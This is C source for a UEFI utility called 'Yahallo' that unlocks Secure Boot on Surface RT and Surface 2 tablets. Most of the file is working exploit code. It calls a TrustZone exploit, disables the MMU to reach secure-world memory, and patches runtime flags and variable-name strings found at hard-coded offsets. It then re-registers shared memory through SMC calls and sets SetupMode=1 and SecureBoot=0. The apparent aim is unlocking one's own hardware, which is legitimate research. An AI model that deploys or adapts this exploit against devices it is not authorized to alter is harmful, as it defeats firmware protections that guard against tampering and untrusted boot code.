// Exploit.c: Devicei specific exploit code

#include "EFIApp.h"
#include "application.h"

void DisplayCommonBanner()
{
  Print(L"\nYahallo - Tegra 3/4 Secure Boot Unlock Utility\n");
  Print(L"Be aware that this process can take a few minutes\n");
}

void SurfaceRTExploit()
{
  EFI_STATUS Status = EFI_SUCCESS;
  UINTN      KeyEvent;

  DisplayCommonBanner();
  Print(L"\nElevator for Surface RT\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvExploit();
  Print(L"Hmmmmmm.\n");

  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();

  UINT32 Something = *((UINT32 *)(EFI_PHYSICAL_ADDRESS)0x80000000);
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Check some offset things
  EFI_PHYSICAL_ADDRESS SetVariableAddress =
      (EFI_PHYSICAL_ADDRESS)(VOID *)gRT->SetVariable;
  // Shared memory start +0x5888, delta +0x5020
  EFI_PHYSICAL_ADDRESS SharedMemoryStartAddressPointerAddress =
      SetVariableAddress + 0x5020;
  EFI_PHYSICAL_ADDRESS SharedMemoryEndAddressPointerAddress =
      SetVariableAddress + 0x5018;
  UINT64 SharedMemoryStartAddress =
      *((UINT64 *)(EFI_PHYSICAL_ADDRESS)SharedMemoryStartAddressPointerAddress);
  // Similarly
  UINT64 SharedMemoryEndAddress =
      *((UINT64 *)(EFI_PHYSICAL_ADDRESS)SharedMemoryEndAddressPointerAddress);
  // Check if the value makes sense or not
  Print(L"Set Variable Address = 0x%llx\n", SetVariableAddress);
  Print(L"Shared Memory Start = 0x%llx\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = 0x%llx\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  Print(L"Performing some search in the TZ memory region...\n");

  // Where is TrustZone binary?
  // Turn off MMU before proceeding
  ArmDisableCachesAndMmu();
  char  GetHashStateString[]  = "GetHashState";
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  char *pRuntimeFlag1;
  char *pRuntimeFlag2;
  char  runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = +0x949d0
  // RuntimeMode flag 1: +0xb9150 (clear buffer and re-reg buffer)
  // RuntimeMode flag 2: +0xb9124 (variable checks that)
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 = ((char *)pTzGetHashStateString + 0x24780);
    pRuntimeFlag2 = ((char *)pTzGetHashStateString + 0x24754);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(
        L"GetHashState string address = 0x%llx\n",
        (UINT64)pTzGetHashStateString);
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  // Re-trigger runtime mode registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at +0x94c64, delta = +0x294
  char *pSetupModeString = ((char *)pTzGetHashStateString + 0x294);
  // String is located at +0x94c78, delta = +0x2a8
  char *pSecureBootString = ((char *)pTzGetHashStateString + 0x2a8);
  // BetupMode
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  Status     = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data   = 0;
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (SetupMode)\n", Status);
  }

exit:
  // Let people inspect the result. Wait a keystoke
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  while (1)
    ;

  gST->ConIn->Reset(gST->ConIn, FALSE);
  gST->BootServices->WaitForEvent(1, &gST->ConIn->WaitForKey, &KeyEvent);
}

void Surface2Exploit()
{
  EFI_STATUS Status = EFI_SUCCESS;
  UINTN      KeyEvent;

  DisplayCommonBanner();
  Print(L"\nElevator for Surface 2\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvExploit();
  Print(L"Hmmmmmm.\n");

  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  UINT32 Something = *((UINT32 *)((VOID *)0x80000000));
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  // If memory access succeeded, we should read something not just FFFFFFF
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Check some offset things. The NvVariableDxe.efi program directly
  // registers its variable handler to EFI System Table, so we have a
  // convenient way to determine its memory location.
  //
  // We want to retrieve the original shared buffer address to
  // normally invoke EFI variable services.

  // Static analysis based on the Surface 2 4.22.500 firmware
  // SetVariableAddress = Base + 0xb54
  UINTN SetVariableAddress = (UINTN)((VOID *)gRT->SetVariable);
  // gSharedMemoryStart = Base + 0x5ff8
  // gSharedMemoryEnd = Base + 0x5ff0
  UINTN SharedMemoryStartAddressPointerAddress = SetVariableAddress + 0x54A4;
  UINTN SharedMemoryEndAddressPointerAddress   = SetVariableAddress + 0x549C;
  UINTN SharedMemoryStartAddress =
      *((UINTN *)SharedMemoryStartAddressPointerAddress);
  // Similarly
  UINTN SharedMemoryEndAddress =
      *((UINTN *)SharedMemoryEndAddressPointerAddress);
  // Check if the value makes sense or not
  Print(L"Set Variable Address = %p\n", SetVariableAddress);
  Print(L"Shared Memory Start = %p\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = %p\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed: size mismatch (wrong "
          L"data?)\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Where is TrustZone binary?
  // Turn off MMU before proceeding for the same reason.
  // There's no good way to determine its actual location assuming it might
  // change, But since we know GetHashState string only appears in TZ binary, we
  // just brute force search the memory for the result.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  const char GetHashStateString[] = "GetHashState";
  // This might not has to search 0x80000000 to 0x83000000, can be smaller
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  volatile char *pRuntimeFlag1;
  volatile char *pRuntimeFlag2;
  char           runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510 (clear buffer and register buffer again
  // with handler) RuntimeMode flag 2: Base+0xbe4e4 (variable checks that so
  // secure variable cannot be written) Clear these two flags to 0 to allow
  // register buffer again
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 = ((volatile char *)pTzGetHashStateString + 0x268E4);
    pRuntimeFlag2 = ((volatile char *)pTzGetHashStateString + 0x268B8);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }

  ArmEnableDataCache();
  ArmEnableInstructionCache();
  ArmEnableMmu();

  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(L"GetHashState string address = %p\n", pTzGetHashStateString);
    // They are supposed to be 1
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

RuntimePhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *(volatile UINT32 *)pRuntimeFlag1 = 0;
  *(volatile UINT32 *)pRuntimeFlag2 = 0;

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-trigger runtime mode switch, which clears the old registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- runtime mode patch phase 1\n");
    goto RuntimePhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

PatchStringPhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at Base+0x9811c, delta = 0x4F0
  volatile char *pSetupModeString =
      ((volatile char *)pTzGetHashStateString + 0x4F0);
  // String is located at Base+0x98130, delta = 0x504
  volatile char *pSecureBootString =
      ((volatile char *)pTzGetHashStateString + 0x504);
  // BetupMode, BecureBoot
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- shared memory address registration\n");
    goto PatchStringPhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  // SecureMode = 1 to disarm all security checks
  Status = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data = 0;
    // SecureBoot = 0 to explicitly disable Secure Boot
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (setting SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (setting SetupMode)\n", Status);
  }

exit:
  // Let people inspect the result. Wait a keystoke
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  Print(L"!!! PLEASE RESET YOUR DEVICE MANUALLY USING THE POWER BUTTON !!!\n");
  while (1)
    ;

  gST->ConIn->Reset(gST->ConIn, FALSE);
  gST->BootServices->WaitForEvent(1, &gST->ConIn->WaitForKey, &KeyEvent);
}
